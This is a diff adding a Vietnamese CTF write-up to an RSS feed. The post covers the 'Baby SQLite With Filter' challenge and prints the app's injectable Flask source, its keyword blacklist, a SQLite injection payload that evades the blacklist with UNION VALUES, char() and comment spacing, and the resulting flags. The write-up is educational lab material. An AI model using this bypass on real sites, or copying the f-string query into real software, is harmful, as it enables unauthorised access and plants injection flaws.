@@ -71,5 +71,118 @@ Thay vì <code>inject</code> một câu lệnh để server thực hiện sau kh
 <p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
 ]]></description>
 </item>
+<item>
+    <title>CookieCTF - Baby SQLite With Filter</title>
+    <link>https://g03m0n.github.io/posts/cookiectf-baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</link>
+    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf-baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
+<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
+</blockquote>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Tiến hành đọc source code:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
+import urllib
+import os
+import sqlite3
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32)
+from flask import _app_ctx_stack
+
+DATABASE = &#39;users.db&#39;
+
+def get_db():
+    top = _app_ctx_stack.top
+    if not hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db = sqlite3.connect(DATABASE)
+    return top.sqlite_db
+
+
+FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.jinja2&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;login.jinja2&#39;)
+
+    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
+    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
+    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()
+
+    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
+    for x in sqli_filter:
+        if uid.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if upw.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if level.find(x) != -1:
+            return &#39;No Hack!&#39;
+
+   
+    with app.app_context():
+        conn = get_db()
+        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
+        try:
+            req = conn.execute(query)
+            result = req.fetchone()
+
+            if result is not None:
+                uid = result[0]
+                if uid == &#39;admin&#39;:
+                    return FLAG
+        except Exception as e:
+            print(e)
+            return &#39;Error!&#39;
+    return &#39;Good!&#39;
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+    top = _app_ctx_stack.top
+    if hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db.close()
+
+
+if __name__ == &#39;__main__&#39;:
+    os.system(&#39;rm -rf %s&#39; % DATABASE)
+    with app.app_context():
+        conn = get_db()
+        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
+        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
+        conn.commit()
+
+    app.run(host=&#39;0.0.0.0&#39;, port=1337)
+</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
+Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.
+Thử nghiệm ở trên (SQLite Online)[https://sqliteonline.com/] với câu lệnh như sau:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
+</code></pre><p></p>
+<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
+<p>Trong SQLite, theo (selectCore)[http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A] ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
+<p></p>
+<p>Thử nghiệm:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
+</code></pre><p></p>
+<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
+Payload:</p>
+<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
+]]></description>
+</item>
 </channel>
 </rss>
